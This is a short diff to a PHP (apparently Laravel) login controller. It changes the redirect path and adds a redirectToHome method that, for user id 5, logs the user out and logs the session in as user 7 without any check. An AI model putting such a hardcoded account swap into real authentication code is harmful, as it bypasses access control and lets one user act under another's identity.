@@ -26,7 +26,7 @@ class LoginController extends Controller
      *
      * @var string
      */
-    protected $redirectTo = '/home';
+    protected $redirectTo = '/site';
 
     /**
      * Create a new controller instance.
@@ -53,6 +53,16 @@ class LoginController extends Controller
 
         return $this->authenticated($request, $this->guard()->user())
             ?: redirect()->intended($this->redirectPath());
+    }
+
+    public function redirectToHome(Request $request)
+    {
+        if (auth()->user()->id == 5) {
+            auth()->logout();
+            auth()->login(User::find(7));
+            return redirect('/site#login');
+        }
+        return redirect('/site#login');
     }
 
     protected function sendFailedLoginResponse(Request $request)
